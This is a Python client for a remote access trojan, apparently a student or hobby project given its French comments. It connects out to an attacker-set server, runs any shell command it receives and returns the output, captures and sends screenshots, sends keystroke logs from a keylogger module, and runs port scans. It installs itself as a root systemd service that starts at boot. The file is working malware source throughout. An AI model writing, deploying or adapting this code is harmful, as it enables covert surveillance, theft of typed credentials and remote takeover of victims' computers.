#!/usr/bin/env python3
import socket
import os
import subprocess
from PIL import ImageGrab
import io
from scanner import p_arg, s_arg
from keylogger import log_keystrokes, start_keylogger, send_keylogs
import threading

HOST = '127.0.0.1'  # change that to the IP address of the server
PORT = 9999  # change that to the port of the server


def screenshot(data_stream):
    screen = ImageGrab.grab()
    #print("Screenshot taken")
    screen_bytes = io.BytesIO()
    screen.save(screen_bytes, format='PNG')
    screen_bytes = screen_bytes.getvalue()

    # Send the size of the screenshot data
    data_stream.sendall(len(screen_bytes).to_bytes(4, byteorder='big'))  # 4 bytes integer for the size of the screenshot data

    # Send the screenshot data
    data_stream.sendall(screen_bytes)
    #print("Screenshot sent")

    #screen.show()
    #screen.close()

def execute_scanner(args):
    """
   scanner function
    """
    try:
        if args[0] == "-p":
            results = p_arg()
        elif args[0] == "-s":
            ports = [21, 22, 80]
            results = s_arg(ports)
        else:
            results = ["wrong arguments"]
        
        return "\n".join(str(result) for result in results) if results else "Aucun résultat."
    except Exception as e:
        return f"Error : {e}"



def make_persistent():
    """
    make the script persistent
    """
    service_path = "/etc/systemd/system/client.service"
    persistent_path = "/usr/local/bin/client.py"
    persistent_path_key = "usr/local/bin/keylogger.py"
    persistent_path_scan = "usr/local/bin/scanner.py"
    try:
        # Copier le script actuel dans un emplacement persistant
        current_script = os.path.realpath(__file__)
        current_dir = os.path.dirname(current_script)
        keylog_script = "keylogger.py"
        keylog_path = os.path.join(current_dir, keylog_script)
        scan_script = "scanner.py"
        scan_path = os.path.join(current_dir, scan_script)

        if not os.path.exists(persistent_path):
            os.system(f"cp {current_script} {persistent_path}")
            os.system(f"chmod +x {persistent_path}")
            os.system(f"cp {keylog_path} {persistent_path_key}")
            os.system(f"chmod +x {persistent_path_key}")
            os.system(f"cp {scan_path} {persistent_path_scan}")
            os.system(f"chmod +x {persistent_path_scan}")
        
        # Créer un fichier de service systemd
        service_content = f"""
[Unit]
Description=Python Client Service
After=network.target

[Service]
ExecStart=/usr/bin/python3 {persistent_path}
Restart=always
User=root
WorkingDirectory=/usr/local/bin
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
"""
        # Écrire le fichier de service
        with open(service_path, "w") as service_file:
            service_file.write(service_content)

        # Configurer le service pour démarrer au boot
        os.system("systemctl daemon-reload")
        os.system("systemctl enable client.service")
        os.system("systemctl start client.service")
    except Exception as e:
        print(f"Erreur dans make_persistent : {e}")



def connect_to_server(): 
    try: 
        # initialize the connection to the server
        s = socket.socket()
        s.connect((HOST, PORT))

        while True:
            data = s.recv(4096) # Buffer size of 4096

            if data[:2].decode("utf-8") == 'cd':
                os.chdir(data[3:].decode("utf-8"))
            
            if len(data) > 0:
                data = data.decode("utf-8")

                if data == 'screenshot':
                    screenshot(s)
                elif data == 'keylog':
                    send_keylogs(s)
                elif data.startswith("scan"):
                    try:
                        args = data.split()[1:]  # Exemple : scan -p
                        scan_results = execute_scanner(args)
                        s.send(str.encode(scan_results + "\n"))
                    except Exception as e:
                        s.send(str.encode(f"Erreur lors du scan : {e}\n"))
                else:
                    cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) # get trough the standard input, output and error
                    output_byte = cmd.stdout.read() + cmd.stderr.read()
                    output_str = str(output_byte, "utf-8")

                    s.send(str.encode(output_str + os.getcwd() + '> '))
    except Exception as e:
        print(f"Erreur dans connect_to_server : {e}")
    finally:
        s.close()

        

if __name__ == "__main__":

    make_persistent()
    keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
    keylogger_thread.start()
    connect_to_server()